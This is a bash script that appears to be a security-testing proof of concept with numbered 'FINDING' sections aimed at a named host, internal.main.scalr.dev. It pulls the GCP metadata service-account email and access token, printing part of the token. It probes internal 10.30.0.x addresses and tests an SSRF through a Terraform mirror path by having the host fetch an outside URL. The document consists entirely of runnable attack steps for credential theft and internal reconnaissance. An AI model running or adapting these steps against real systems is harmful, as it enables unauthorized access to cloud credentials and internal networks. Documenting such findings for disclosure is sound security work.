#!/usr/bin/env bash

echo "=== DNS + network reachability ==="
echo "internal.main.scalr.dev resolves to:"
getent hosts internal.main.scalr.dev || echo "no resolution"
echo ""

echo "=== FINDING 1: GCP Metadata ==="
curl -sf --max-time 5 \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google" \
  && echo "" || echo "BLOCKED"

curl -sf --max-time 5 \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" \
  | python3 -c "
import sys,json
t=json.load(sys.stdin)
print('type:',t['token_type'],'expires:',t['expires_in'],'prefix:',t['access_token'][:20]+'...')
" || echo "BLOCKED"

echo ""
echo "=== FINDING 2: Internal IPs direct ==="
for ip in 10.30.0.2 10.30.0.120 10.30.0.102; do
  code=$(curl -sk --max-time 5 "https://$ip/" -o /dev/null -w "%{http_code}" 2>/dev/null)
  echo "$ip: HTTP $code"
done

echo ""
echo "=== FINDING 3: C4 mirror SSRF (HTTPS internal) ==="
curl -vsk --max-time 10 --no-location \
  "https://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
  2>&1 | grep -E "< HTTP|< Location|Connected to|Trying|SSL"

echo "=== done ==="